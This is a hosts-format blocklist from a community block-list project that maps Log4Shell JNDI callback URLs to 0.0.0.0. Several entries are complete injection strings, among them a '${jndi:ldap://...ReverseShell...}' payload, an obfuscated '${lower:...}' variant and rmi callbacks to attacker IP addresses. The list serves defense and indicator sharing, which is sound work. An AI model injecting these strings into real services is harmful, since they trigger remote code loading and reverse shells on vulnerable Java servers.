# ------------------------------------[UPDATE]--------------------------------------
# Title: The Block List Project - Call-Back-Block list
# Expires: 1 day
# Homepage: https://chillzone.live/
# Help: zombie2312#7310
# License: https://unlicense.org
# Total number of network filters: 2782
# ------------------------------------[SUPPORT]-------------------------------------
# You can support by:
# - reporting false positives
# - making a donation: https://paypal.me/blocklistproject
# -------------------------------------[INFO]---------------------------------------
#
# Call-Back-Block list
# ------------------------------------[FILTERS]-------------------------------------
0.0.0.0 ldap://54c015aff381.bingsearchlib.com:39356/a
0.0.0.0 ldap://faea7437a673.bingsearchlib.com:39356/a
0.0.0.0 ldap://8282e3b45423.bingsearchlib.com:39356/a
0.0.0.0 ldap://f7d2c7f26217.bingsearchlib.com:39356/a
0.0.0.0 ldap://4012579e955f.bingsearchlib.com:39356/a
0.0.0.0 ldap://b7c33d74c2f2.bingsearchlib.com:39356/a
0.0.0.0 ldap://1cd8008627fa.bingsearchlib.com:39356/a
0.0.0.0 ldap://abee06540bfe.bingsearchlib.com:39356/a
0.0.0.0 ldap://7b28da85d1fc.bingsearchlib.com:39356/a
0.0.0.0 ldap://447d3a339473.bingsearchlib.com:39356/a
0.0.0.0 ldap://1cb4ab1f331a.bingsearchlib.com:39356/a
0.0.0.0 ldap://84af80632822.bingsearchlib.com:39356/a
0.0.0.0 ldap://282dcef2c41f.bingsearchlib.com:39356/a
0.0.0.0 ldap://86dbc792b7d4.bingsearchlib.com:39356/a
0.0.0.0 ldap://82afeb3d0b11.bingsearchlib.com:39356/a
0.0.0.0 ldap://2c66efb5fd84.bingsearchlib.com:39356/a
0.0.0.0 ldap://e1c6194c0760.bingsearchlib.com:39356/a
0.0.0.0 ldap://f986210d157a.bingsearchlib.com:39356/a
0.0.0.0 ldap://528f0838ae11.bingsearchlib.com:39356/a
0.0.0.0 ldap://8caa3e3ea145.bingsearchlib.com:39356/a
0.0.0.0 ldap://cb734220a05d.bingsearchlib.com:39356/a
0.0.0.0 ldap://df40a853a732.bingsearchlib.com:39356/a
0.0.0.0 ldap://53b21c570edb.bingsearchlib.com:39356/a
0.0.0.0 ldap://a74d01648bea.bingsearchlib.com:39356/a
0.0.0.0 ldap://5e77b87827b3.bingsearchlib.com:39356/a
0.0.0.0 ldap://865e410a2ff4.bingsearchlib.com:39356/a
0.0.0.0 ldap://b4c8daa63330.bingsearchlib.com:39356/a
0.0.0.0 ldap://70c335a0d813.bingsearchlib.com:39356/a
0.0.0.0 ldap://2769ffc08aae.bingsearchlib.com:39356/a
0.0.0.0 ldap://f9c61db13513.bingsearchlib.com:39356/a
0.0.0.0 ldap://a33f41daca17.bingsearchlib.com:39356/a
0.0.0.0 ldap://42ba685e49f3.bingsearchlib.com:39356/a
0.0.0.0 ldap://baf9ff187410.bingsearchlib.com:39356/a
0.0.0.0 ldap://ad578d23bdad.bingsearchlib.com:39356/a
0.0.0.0 ldap://3bef8e467305.bingsearchlib.com:39356/a
0.0.0.0 ldap://79d3c6a58488.bingsearchlib.com:39356/a
0.0.0.0 ldap://88c40a34cf52.bingsearchlib.com:39356/a
0.0.0.0 ldap://9cb6e389bc8c.bingsearchlib.com:39356/a
0.0.0.0 ldap://d9e62191c871.bingsearchlib.com:39356/a
0.0.0.0 ldap://e51f2de2cd97.bingsearchlib.com:39356/a
0.0.0.0 ldap://4ee46526baa2.bingsearchlib.com:39356/a
0.0.0.0 ldap://c961c04db902.bingsearchlib.com:39356/a
0.0.0.0 ldap://44cca783ad16.bingsearchlib.com:39356/a
0.0.0.0 ldap://3133ebceb44d.bingsearchlib.com:39356/a
0.0.0.0 ldap://13bd75c8f879.bingsearchlib.com:39356/a
0.0.0.0 ldap://346d134fcfbb.bingsearchlib.com:39356/a
0.0.0.0 ldap://f7596746de16.bingsearchlib.com:39356/a
0.0.0.0 ldap://1702e2f8aa8e.bingsearchlib.com:39356/a
0.0.0.0 ldap://aba268c66dd3.bingsearchlib.com:39356/a
0.0.0.0 /3.1 ${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999
0.0.0.0 ldap://0baa4f050aed.bingsearchlib.com:39356/a
0.0.0.0 ldap://2c4314c48c39.bingsearchlib.com:39356/a
0.0.0.0 ldap://1c788b4a217b.bingsearchlib.com:39356/a
0.0.0.0 ldap://5799e6d71743.bingsearchlib.com:39356/a
0.0.0.0 ldap://a4079b92cf3d.bingsearchlib.com:39356/a
0.0.0.0 ldap://46d97df39a02.bingsearchlib.com:39356/a
0.0.0.0 ldap://63a4925ae323.bingsearchlib.com:39356/a
0.0.0.0 ldap://15df2d977578.bingsearchlib.com:39356/a
0.0.0.0 ldap://5fa620cc5e56.bingsearchlib.com:39356/a
0.0.0.0 ldap://785780daf45b.bingsearchlib.com:39356/a
0.0.0.0 ldap://61289367b2a1.bingsearchlib.com:39356/a
0.0.0.0 ldap://36e18fd31a0f.bingsearchlib.com:39356/a
0.0.0.0 ldap://3d57b19c7dd3.bingsearchlib.com:39356/a
0.0.0.0 ldap://c1c7715fd6c6.bingsearchlib.com:39356/a
0.0.0.0 ldap://0b713477a743.bingsearchlib.com:39356/a
0.0.0.0 ldap://c5eca394e493.bingsearchlib.com:39356/a
0.0.0.0 ldap://62.182.158.156:1389/website
0.0.0.0 ldap://d15d803489af.bingsearchlib.com:39356/a
0.0.0.0 ldap://d549b5ea402a.bingsearchlib.com:39356/a
0.0.0.0 ldap://2bfed97c2961.bingsearchlib.com:39356/a
0.0.0.0 ldap://646feaf14808.bingsearchlib.com:39356/a
0.0.0.0 ldap://91e9e655197f.bingsearchlib.com:39356/a
0.0.0.0 ldap://f6634b129f94.bingsearchlib.com:39356/a
0.0.0.0 ldap://f4d5efdda59f.bingsearchlib.com:39356/a
0.0.0.0 ldap://d8e9f17cf7bc.bingsearchlib.com:39356/a
0.0.0.0 ldap://2567c2c73758.bingsearchlib.com:39356/a
0.0.0.0 ldap://e712032fdde0.bingsearchlib.com:39356/a
0.0.0.0 ldap://76d4d5c312ce.bingsearchlib.com:39356/a
0.0.0.0 ldap://ba632748f7e2.bingsearchlib.com:39356/a
0.0.0.0 ldap://13fc220878f7.bingsearchlib.com:39356/a
0.0.0.0 ldap://8c738a19abc9.bingsearchlib.com:39356/a
0.0.0.0 ldap://7312f601ecba.bingsearchlib.com:39356/a
0.0.0.0 ldap://e6e7c03c998d.bingsearchlib.com:39356/a
0.0.0.0 ldap://da84236b9b85.bingsearchlib.com:39356/a
0.0.0.0 ldap://d22485f86152.bingsearchlib.com:39356/a
0.0.0.0 ldap://092a09045f40.bingsearchlib.com:39356/a
0.0.0.0 ldap://badacc6a9ea6.bingsearchlib.com:39356/a
0.0.0.0 ldap://51118579478f.bingsearchlib.com:39356/a
0.0.0.0 ldap://33d280df2b53.bingsearchlib.com:39356/a
0.0.0.0 ldap://12ff8f937c9e.bingsearchlib.com:39356/a
0.0.0.0 ldap://3258e8677d68.bingsearchlib.com:39356/a
0.0.0.0 ldap://f09fc1554c75.bingsearchlib.com:39356/a
0.0.0.0 ldap://a7aa8415ab06.bingsearchlib.com:39356/a
0.0.0.0 ldap://12e3621bf406.bingsearchlib.com:39356/a
0.0.0.0 ldap://9cb05af297a8.bingsearchlib.com:39356/a
0.0.0.0 ldap://e57e49354da1.bingsearchlib.com:39356/a
0.0.0.0 ldap://ea89fd7b0fe8.bingsearchlib.com:39356/a
0.0.0.0 ldap://aa71578ac9d9.bingsearchlib.com:39356/a
0.0.0.0 ldap://59875dbf88cb.bingsearchlib.com:39356/a
0.0.0.0 ldap://beb027d50fec.bingsearchlib.com:39356/a
0.0.0.0 ldap://944a579d076d.bingsearchlib.com:39356/a
0.0.0.0 ldap://009cf07646dc.bingsearchlib.com:39356/a
0.0.0.0 ldap://10580de787ba.bingsearchlib.com:39356/a
0.0.0.0 ldap://f346e3e0baec.bingsearchlib.com:39356/a
0.0.0.0 ldap://46fda53f5c6e.bingsearchlib.com:39356/a
0.0.0.0 ldap://000864ffaf5d.bingsearchlib.com:39356/a
0.0.0.0 ldap://aa9a6b64c58a.bingsearchlib.com:39356/a
0.0.0.0 ldap://567d24d1ac33.bingsearchlib.com:39356/a
0.0.0.0 ldap://c87486ee5ca5.bingsearchlib.com:39356/a
0.0.0.0 ldap://97b23f4fdbbe.bingsearchlib.com:39356/a
0.0.0.0 ldap://c34a8ab39d0e.bingsearchlib.com:39356/a
0.0.0.0 ldap://b445454d1b03.bingsearchlib.com:39356/a
0.0.0.0 ldap://7d8f7f6b4d13.bingsearchlib.com:39356/a
0.0.0.0 ldap://4070ed75d85e.bingsearchlib.com:39356/a
0.0.0.0 ldap://013982df19dc.bingsearchlib.com:39356/a
0.0.0.0 ldap://cff1fbafb9a9.bingsearchlib.com:39356/a
0.0.0.0 ldap://7afe7e681d5e.bingsearchlib.com:39356/a
0.0.0.0 ldap://d820c35bb084.bingsearchlib.com:39356/a
0.0.0.0 ldap://bf794a077196.bingsearchlib.com:39356/a
0.0.0.0 ldap://544fe6d9675e.bingsearchlib.com:39356/a
0.0.0.0 ldap://91c5e4e1df27.bingsearchlib.com:39356/a
0.0.0.0 ldap://ee336ffd7dc9.bingsearchlib.com:39356/a
0.0.0.0 ldap://90a6fd44cd31.bingsearchlib.com:39356/a
0.0.0.0 ldap://fc7d972ac028.bingsearchlib.com:39356/a
0.0.0.0 ldap://876c3c85c4f2.bingsearchlib.com:39356/a
0.0.0.0 ldap://55c73f1c7587.bingsearchlib.com:39356/a
0.0.0.0 ldap://12e31f4d026b.bingsearchlib.com:39356/a
0.0.0.0 ldap://1d497d924374.bingsearchlib.com:39356/a
0.0.0.0 ldap://9b028f49472a.bingsearchlib.com:39356/a
0.0.0.0 ldap://a60bb4d20c87.bingsearchlib.com:39356/a
0.0.0.0 ldap://736ee1e7b59c.bingsearchlib.com:39356/a
0.0.0.0 ldap://d4f22825f860.bingsearchlib.com:39356/a
0.0.0.0 ldap://73849ef688ba.bingsearchlib.com:39356/a
0.0.0.0 ldap://91124b924166.bingsearchlib.com:39356/a
0.0.0.0 ldap://813264da9150.bingsearchlib.com:39356/a
0.0.0.0 ldap://831f70006f81.bingsearchlib.com:39356/a
0.0.0.0 ldap://470ffdd3c533.bingsearchlib.com:39356/a
0.0.0.0 ldap://8c92e83cd554.bingsearchlib.com:39356/a
0.0.0.0 ldap://b1b0ca712547.bingsearchlib.com:39356/a
0.0.0.0 ldap://814cbd9db83a.bingsearchlib.com:39356/a
0.0.0.0 ldap://2a5f20f1d7a2.bingsearchlib.com:39356/a
0.0.0.0 ldap://c4c5a34bab9d.bingsearchlib.com:39356/a
0.0.0.0 ldap://416b21120a59.bingsearchlib.com:39356/a
0.0.0.0 ldap://ff3de8f7cd0d.bingsearchlib.com:39356/a
0.0.0.0 ldap://e792baef53c1.bingsearchlib.com:39356/a
0.0.0.0 ldap://b952205e8281.bingsearchlib.com:39356/a
0.0.0.0 ldap://e7c98360374e.bingsearchlib.com:39356/a
0.0.0.0 ldap://35ff36e69c90.bingsearchlib.com:39356/a
0.0.0.0 ldap://c5eb13fe41b6.bingsearchlib.com:39356/a
0.0.0.0 ldap://7648be5f96b7.bingsearchlib.com:39356/a
0.0.0.0 ldap://9fd5a935e06a.bingsearchlib.com:39356/a
0.0.0.0 ldap://6f22b0f41706.bingsearchlib.com:39356/a
0.0.0.0 ldap://5366eae72dec.bingsearchlib.com:39356/a
0.0.0.0 ldap://380103eb7aeb.bingsearchlib.com:39356/a
0.0.0.0 ldap://c2b5c149509a.bingsearchlib.com:39356/a
0.0.0.0 ldap://c17f75217c47.bingsearchlib.com:39356/a
0.0.0.0 ldap://0befe45a1117.bingsearchlib.com:39356/a
0.0.0.0 ldap://7d90568d1cd1.bingsearchlib.com:39356/a
0.0.0.0 ldap://f9b543851f1b.bingsearchlib.com:39356/a
0.0.0.0 ldap://ea3126d1be64.bingsearchlib.com:39356/a
0.0.0.0 ldap://988ec3323ba3.bingsearchlib.com:39356/a
0.0.0.0 ldap://25db94c8e8f8.bingsearchlib.com:39356/a
0.0.0.0 ldap://137683b2aa41.bingsearchlib.com:39356/a
0.0.0.0 ldap://2672fdd4d9dc.bingsearchlib.com:39356/a
0.0.0.0 ldap://90f0268c6d14.bingsearchlib.com:39356/a
0.0.0.0 ldap://40cef4b0858e.bingsearchlib.com:39356/a
0.0.0.0 ldap://d5e1b4f370cd.bingsearchlib.com:39356/a
0.0.0.0 ldap://da28f3f294f3.bingsearchlib.com:39356/a
0.0.0.0 ldap://c9203f04fd17.bingsearchlib.com:39356/a
0.0.0.0 ldap://2725e8525009.bingsearchlib.com:39356/a
0.0.0.0 ldap://649cc4144d86.bingsearchlib.com:39356/a
0.0.0.0 ldap://7bb715d20c2e.bingsearchlib.com:39356/a
0.0.0.0 ldap://134.209.163.248:80/callback/ldap2
0.0.0.0 ldap://753741cf5e16.bingsearchlib.com:39356/a
0.0.0.0 ldap://78f079ee26bc.bingsearchlib.com:39356/a
0.0.0.0 ldap://c5921cee5a6b.bingsearchlib.com:39356/a
0.0.0.0 ldap://c1d72cecaa3d.bingsearchlib.com:39356/a
0.0.0.0 ldap://09adfa0a2dac.bingsearchlib.com:39356/a
0.0.0.0 ldap://daaa3bc9c998.bingsearchlib.com:39356/a
0.0.0.0 ldap://34c20860658b.bingsearchlib.com:39356/a
0.0.0.0 ldap://7e9eb2615c8e.bingsearchlib.com:39356/a
0.0.0.0 ldap://d43dacc11c26.bingsearchlib.com:39356/a
0.0.0.0 ldap://04c54d3672bd.bingsearchlib.com:39356/a
0.0.0.0 ldap://7c35180b275f.bingsearchlib.com:39356/a
0.0.0.0 ldap://d603a049a258.bingsearchlib.com:39356/a
0.0.0.0 ldap://3564a4a65bc8.bingsearchlib.com:39356/a
0.0.0.0 ldap://ef144e2d943b.bingsearchlib.com:39356/a
0.0.0.0 ldap://dfc35a10d2b6.bingsearchlib.com:39356/a
0.0.0.0 ldap://377f2cd13353.bingsearchlib.com:39356/a
0.0.0.0 ldap://024e5d4e29f6.bingsearchlib.com:39356/a
0.0.0.0 ldap://22e1457310ea.bingsearchlib.com:39356/a
0.0.0.0 ldap://78.31.71.248:1389/mhomjy
0.0.0.0 ldap://d01e6ec48be7.bingsearchlib.com:39356/a
0.0.0.0 ldap://c79f0d1aa0ab.bingsearchlib.com:39356/a
0.0.0.0 ldap://0f7b09b34039.bingsearchlib.com:39356/a
0.0.0.0 ldap://61af907c9c16.bingsearchlib.com:39356/a
0.0.0.0 ldap://58d9c729c8f8.bingsearchlib.com:39356/a
0.0.0.0 ldap://9a9140eedd32.bingsearchlib.com:39356/a
0.0.0.0 ldap://526cde5a9a9a.bingsearchlib.com:39356/a
0.0.0.0 ldap://aa6ac7a969a6.bingsearchlib.com:39356/a
0.0.0.0 ldap://1c9831159f4d.bingsearchlib.com:39356/a
0.0.0.0 ldap://910eef74df8d.bingsearchlib.com:39356/a
0.0.0.0 ldap://6143bdb7e926.bingsearchlib.com:39356/a
0.0.0.0 ldap://e2a70b2215fb.bingsearchlib.com:39356/a
0.0.0.0 ldap://df13796cad52.bingsearchlib.com:39356/a
0.0.0.0 ldap://484aa866cd6c.bingsearchlib.com:39356/a
0.0.0.0 ldap://953c9128d9db.bingsearchlib.com:39356/a
0.0.0.0 ldap://262ade32441e.bingsearchlib.com:39356/a
0.0.0.0 ldap://c0d5679b49ba.bingsearchlib.com:39356/a
0.0.0.0 ldap://7c1488d8d063.bingsearchlib.com:39356/a
0.0.0.0 ldap://46c5056a2388.bingsearchlib.com:39356/a
0.0.0.0 ldap://7c3bdfa7e63d.bingsearchlib.com:39356/a
0.0.0.0 ldap://ff922cf113dd.bingsearchlib.com:39356/a
0.0.0.0 ldap://35e986ba16e9.bingsearchlib.com:39356/a
0.0.0.0 ldap://c87678766adb.bingsearchlib.com:39356/a
0.0.0.0 ldap://57de040ef070.bingsearchlib.com:39356/a
0.0.0.0 ldap://1181a9ec5624.bingsearchlib.com:39356/a
0.0.0.0 ldap://852a92bab238.bingsearchlib.com:39356/a
0.0.0.0 ldap://224bb1fc26e9.bingsearchlib.com:39356/a
0.0.0.0 ldap://bd417b6b753c.bingsearchlib.com:39356/a
0.0.0.0 ldap://c84d90bce5b0.bingsearchlib.com:39356/a
0.0.0.0 ldap://f89cbcc37a7f.bingsearchlib.com:39356/a
0.0.0.0 ldap://608ac2d94757.bingsearchlib.com:39356/a
0.0.0.0 ldap://18a5633f1455.bingsearchlib.com:39356/a
0.0.0.0 ldap://4e35709115ae.bingsearchlib.com:39356/a
0.0.0.0 ldap://a087aca06e38.bingsearchlib.com:39356/a
0.0.0.0 ldap://818231ed351f.bingsearchlib.com:39356/a
0.0.0.0 ldap://e596450a47c3.bingsearchlib.com:39356/a
0.0.0.0 ldap://64018b38d1bd.bingsearchlib.com:39356/a
0.0.0.0 ldap://94b53a59053e.bingsearchlib.com:39356/a
0.0.0.0 ldap://18643f1cd643.bingsearchlib.com:39356/a
0.0.0.0 ldap://4059aa7bbc10.bingsearchlib.com:39356/a
0.0.0.0 ldap://cf33bef6c22a.bingsearchlib.com:39356/a
0.0.0.0 ldap://0005f49368dd.bingsearchlib.com:39356/a
0.0.0.0 ldap://8bf085ae1724.bingsearchlib.com:39356/a
0.0.0.0 ldap://b109fb0c0221.bingsearchlib.com:39356/a
0.0.0.0 ldap://c56d4b328f98.bingsearchlib.com:39356/a
0.0.0.0 ldap://9bb982fc98e1.bingsearchlib.com:39356/a
0.0.0.0 ldap://da49b3c34612.bingsearchlib.com:39356/a
0.0.0.0 ldap://b91ae2bcd6b0.bingsearchlib.com:39356/a
0.0.0.0 ldap://c4910c24eedb.bingsearchlib.com:39356/a
0.0.0.0 ldap://c4620ef01482.bingsearchlib.com:39356/a
0.0.0.0 ldap://2106e8634be7.bingsearchlib.com:39356/a
0.0.0.0 ldap://1f0e4d34cb8f.bingsearchlib.com:39356/a
0.0.0.0 ldap://633b4627b3d0.bingsearchlib.com:39356/a
0.0.0.0 ldap://85d98f279708.bingsearchlib.com:39356/a
0.0.0.0 ldap://bbbd86e55b18.bingsearchlib.com:39356/a
0.0.0.0 ldap://a94d5e4b2e81.bingsearchlib.com:39356/a
0.0.0.0 ldap://8fa951c85ea3.bingsearchlib.com:39356/a
0.0.0.0 ldap://525b9f8c810a.bingsearchlib.com:39356/a
0.0.0.0 ldap://0d616f24ad97.bingsearchlib.com:39356/a
0.0.0.0 ldap://1f8d1c500125.bingsearchlib.com:39356/a
0.0.0.0 ldap://ff200990c7ee.bingsearchlib.com:39356/a
0.0.0.0 ldap://023371450809.bingsearchlib.com:39356/a
0.0.0.0 ldap://e4f4e08da112.bingsearchlib.com:39356/a
0.0.0.0 ldap://20be518af0b1.bingsearchlib.com:39356/a
0.0.0.0 ldap://6cb8a5e9af80.bingsearchlib.com:39356/a
0.0.0.0 ldap://60292d90d1b2.bingsearchlib.com:39356/a
0.0.0.0 ldap://f11b4f9fe04a.bingsearchlib.com:39356/a
0.0.0.0 ldap://a42ae47f133b.bingsearchlib.com:39356/a
0.0.0.0 ldap://181348c85701.bingsearchlib.com:39356/a
0.0.0.0 ldap://119b7332016d.bingsearchlib.com:39356/a
0.0.0.0 ldap://0d8589188b4c.bingsearchlib.com:39356/a
0.0.0.0 ldap://4f894784b6ef.bingsearchlib.com:39356/a
0.0.0.0 ldap://0455cf49e9f0.bingsearchlib.com:39356/a
0.0.0.0 ldap://f204218fc1d8.bingsearchlib.com:39356/a
0.0.0.0 ldap://e9d56ea4f086.bingsearchlib.com:39356/a
0.0.0.0 ldap://17db07985c26.bingsearchlib.com:39356/a
0.0.0.0 ldap://0a8d2f72ee8e.bingsearchlib.com:39356/a
0.0.0.0 ldap://2527ae46a154.bingsearchlib.com:39356/a
0.0.0.0 ldap://a0e2d4daf724.bingsearchlib.com:39356/a
0.0.0.0 ldap://8078d8030779.bingsearchlib.com:39356/a
0.0.0.0 ldap://923bc36ca25a.bingsearchlib.com:39356/a
0.0.0.0 ldap://94bb3af838fe.bingsearchlib.com:39356/a
0.0.0.0 ldap://b6b34cfd1b59.bingsearchlib.com:39356/a
0.0.0.0 ldap://3adfbdeec1fe.bingsearchlib.com:39356/a
0.0.0.0 ldap://ec725b34.dns.1433.eu.org
0.0.0.0 ldap://75e94c926b75.bingsearchlib.com:39356/a
0.0.0.0 ldap://d2916aba9dbc.bingsearchlib.com:39356/a
0.0.0.0 ${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback
0.0.0.0 ldap://efec676fa96c.bingsearchlib.com:39356/a
0.0.0.0 ldap://1154f765fdc8.bingsearchlib.com:39356/a
0.0.0.0 ldap://e9b0342d054b.bingsearchlib.com:39356/a
0.0.0.0 ldap://184b0e00a853.bingsearchlib.com:39356/a
0.0.0.0 ldap://1aeb1cfef766.bingsearchlib.com:39356/a
0.0.0.0 ldap://b17e2c7e5615.bingsearchlib.com:39356/a
0.0.0.0 ldap://9204dad80d70.bingsearchlib.com:39356/a
0.0.0.0 ldap://785eb896dd6b.bingsearchlib.com:39356/a
0.0.0.0 ldap://a6ce76c92e75.bingsearchlib.com:39356/a
0.0.0.0 ldap://713cf0ac1632.bingsearchlib.com:39356/a
0.0.0.0 ldap://0e0a66be4e2a.bingsearchlib.com:39356/a
0.0.0.0 ldap://7cc8976f0f63.bingsearchlib.com:39356/a
0.0.0.0 ldap://44dd10a4e8e0.bingsearchlib.com:39356/a
0.0.0.0 ldap://fee3c5eb7fab.bingsearchlib.com:39356/a
0.0.0.0 ldap://849a606b15ce.bingsearchlib.com:39356/a
0.0.0.0 ldap://df0cfd6d42bb.bingsearchlib.com:39356/a
0.0.0.0 ldap://a615cbc5751b.bingsearchlib.com:39356/a
0.0.0.0 ldap://c1661513c406.bingsearchlib.com:39356/a
0.0.0.0 ldap://d80db2c7a5e8.bingsearchlib.com:39356/a
0.0.0.0 ldap://5015222e57dc.bingsearchlib.com:39356/a
0.0.0.0 ldap://34b4742e7dca.bingsearchlib.com:39356/a
0.0.0.0 ldap://640ce558d2f7.bingsearchlib.com:39356/a
0.0.0.0 ldap://bb6f692aae16.bingsearchlib.com:39356/a
0.0.0.0 ldap://5e7baaf46dc0.bingsearchlib.com:39356/a
0.0.0.0 ldap://8637e64b7fda.bingsearchlib.com:39356/a
0.0.0.0 ldap://fbeed47e4434.bingsearchlib.com:39356/a
0.0.0.0 ldap://b35c5c4ae2f8.bingsearchlib.com:39356/a
0.0.0.0 ldap://eda7c886f204.bingsearchlib.com:39356/a
0.0.0.0 ldap://70aa6f2a62f7.bingsearchlib.com:39356/a
0.0.0.0 ldap://9861999f449d.bingsearchlib.com:39356/a
0.0.0.0 ldap://6622a5adc159.bingsearchlib.com:39356/a
0.0.0.0 ldap://2d7e6fce281c.bingsearchlib.com:39356/a
0.0.0.0 ldap://0d999a4161b7.bingsearchlib.com:39356/a
0.0.0.0 ldap://d9deb806b682.bingsearchlib.com:39356/a
0.0.0.0 ldap://b6415f73214e.bingsearchlib.com:39356/a
0.0.0.0 ldap://cc5771ce6578.bingsearchlib.com:39356/a
0.0.0.0 ldap://e24fb529157b.bingsearchlib.com:39356/a
0.0.0.0 ldap://0e3bfd730cad.bingsearchlib.com:39356/a
0.0.0.0 ldap://3ce54779494f.bingsearchlib.com:39356/a
0.0.0.0 ldap://1056ba40b158.bingsearchlib.com:39356/a
0.0.0.0 ldap://8dbe05af2628.bingsearchlib.com:39356/a
0.0.0.0 ldap://753802a2fd2a.bingsearchlib.com:39356/a
0.0.0.0 ldap://2aac03639b45.bingsearchlib.com:39356/a
0.0.0.0 ldap://d331a3b8142b.bingsearchlib.com:39356/a
0.0.0.0 ldap://b0f54bc8915e.bingsearchlib.com:39356/a
0.0.0.0 ldap://4ef6f10dd8a2.bingsearchlib.com:39356/a
0.0.0.0 ldap://60ec26e4b948.bingsearchlib.com:39356/a
0.0.0.0 ldap://4c3564dc3448.bingsearchlib.com:39356/a
0.0.0.0 ldap://f7e725286953.bingsearchlib.com:39356/a
0.0.0.0 ldap://824e2d2c2e86.bingsearchlib.com:39356/a
0.0.0.0 ldap://a4fe382ce6c0.bingsearchlib.com:39356/a
0.0.0.0 ldap://d65075490d2e.bingsearchlib.com:39356/a
0.0.0.0 ldap://2fecf78c35d9.bingsearchlib.com:39356/a
0.0.0.0 ldap://a991dc848d76.bingsearchlib.com:39356/a
0.0.0.0 ldap://72dcfc1dddc0.bingsearchlib.com:39356/a
0.0.0.0 ldap://99f13e6c9bb8.bingsearchlib.com:39356/a
0.0.0.0 ldap://e8dbd06447c4.bingsearchlib.com:39356/a
0.0.0.0 ldap://1606be04fe34.bingsearchlib.com:39356/a
0.0.0.0 ldap://f878570be49d.bingsearchlib.com:39356/a
0.0.0.0 ldap://93a667c2ebdb.bingsearchlib.com:39356/a
0.0.0.0 ldap://3f7153422cf8.bingsearchlib.com:39356/a
0.0.0.0 ldap://dc05762b0bc2.bingsearchlib.com:39356/a
0.0.0.0 ldap://d5c3417d328d.bingsearchlib.com:39356/a
0.0.0.0 ldap://2aeb9a8703d5.bingsearchlib.com:39356/a
0.0.0.0 ldap://bc3b328b071a.bingsearchlib.com:39356/a
0.0.0.0 ldap://f1d26c045e5d.bingsearchlib.com:39356/a
0.0.0.0 ldap://efd672a31f1d.bingsearchlib.com:39356/a
0.0.0.0 ldap://49fc7bf867ef.bingsearchlib.com:39356/a
0.0.0.0 ldap://28a5c6b97cdb.bingsearchlib.com:39356/a
0.0.0.0 ldap://065ce2d58fdd.bingsearchlib.com:39356/a
0.0.0.0 ldap://a2e9fb2e3c4c.bingsearchlib.com:39356/a
0.0.0.0 ldap://756c9905a560.bingsearchlib.com:39356/a
0.0.0.0 ldap://dedb05132e0d.bingsearchlib.com:39356/a
0.0.0.0 ldap://e08499cffcd8.bingsearchlib.com:39356/a
0.0.0.0 ldap://b74dd0e311be.bingsearchlib.com:39356/a
0.0.0.0 ldap://5ea60116d80e.bingsearchlib.com:39356/a
0.0.0.0 ldap://dacf636c2540.bingsearchlib.com:39356/a
0.0.0.0 ldap://f19d3d3b600a.bingsearchlib.com:39356/a
0.0.0.0 ldap://e6d22cf0fc95.bingsearchlib.com:39356/a
0.0.0.0 ldap://e7929a62326d.bingsearchlib.com:39356/a
0.0.0.0 ldap://9ee7c9fe.dns.1433.eu.org
0.0.0.0 ldap://cdcb81168792.bingsearchlib.com:39356/a
0.0.0.0 ldap://7971f7b4eb13.bingsearchlib.com:39356/a
0.0.0.0 ldap://8b5e31cb04bf.bingsearchlib.com:39356/a
0.0.0.0 ldap://d489b4ab35e4.bingsearchlib.com:39356/a
0.0.0.0 ldap://184dcac8da3c.bingsearchlib.com:39356/a
0.0.0.0 ldap://8cc8e9021b91.bingsearchlib.com:39356/a
0.0.0.0 /3.1 ${jndi:ldap://167.172.44.255:1389/epepap
0.0.0.0 /3.1 ${jndi:ldap://167.172.44.255:42063/epepap
0.0.0.0 /3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass
0.0.0.0 /3.1 ${jndi:ldap://167.172.44.255:1389/LegitimateJavaClass
0.0.0.0 /3.1 ${jndi:ldap://167.172.44.255:1389/Lazn
0.0.0.0 ldap://71b4d4928c65.bingsearchlib.com:39356/a
0.0.0.0 ldap://163.172.157.143:1389/skziyb
0.0.0.0 rmi://139.59.175.247:1099/ej5ytj
0.0.0.0 ldap://fa1dd1a841bf.bingsearchlib.com:39356/a
0.0.0.0 ldap://8e1dab694af9.bingsearchlib.com:39356/a
0.0.0.0 ldap://fbc8a1502970.bingsearchlib.com:39356/a
0.0.0.0 ldap://d72fe3e1e907.bingsearchlib.com:39356/a
0.0.0.0 ldap://21010c91173b.bingsearchlib.com:39356/a
0.0.0.0 ldap://1baaa1825889.bingsearchlib.com:39356/a
0.0.0.0 ldap://307087f7579a.bingsearchlib.com:39356/a
